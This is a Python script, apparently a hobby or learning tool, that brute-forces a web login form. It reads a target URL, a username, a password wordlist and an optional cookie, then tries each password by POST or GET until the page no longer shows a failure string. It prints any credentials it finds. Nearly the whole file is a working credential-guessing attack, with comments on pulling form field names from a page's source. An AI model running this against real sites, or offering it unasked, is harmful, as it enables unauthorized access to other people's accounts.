import requests
from termcolor import colored

url = input("[+] Enter target url: ")
user_name = input("[+] Enter the username for BruteForce: ")
password_file = input("[+] Enter the password file to use: ")
login_failed_string = input("[+] Enter String that occurs when login fails: ")
cookie_value = input("[+] Enter Cookie Value (Optional): ")

def cracking(user_name,url):
    for password in passwords:
        password = password.strip()
        print('Trying ' + password)
        data = {'username': user_name, 'password': password, 'Login': 'submit'} #'username','password' and 'Login' are the name of the feild in webpage, we can get that in source code of webpage
        #'submit' is the type of button in webpage, This one also we can get it from source code of webpage
        if cookie_value!= '':
            response=requests.get(url, params={'username': user_name, 'password': password, 'Login': 'Login'},cookies={'Cookie': cookie_value})
        else:
            response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored('Found Username: => ' + user_name, 'green'))
            print(colored('Found Password: => ' + password, 'green'))
            exit()



with open(password_file,'r') as passwords:#password file stored in same directory
    cracking(user_name,url)

print(colored('[!] Password Not In List', 'red'))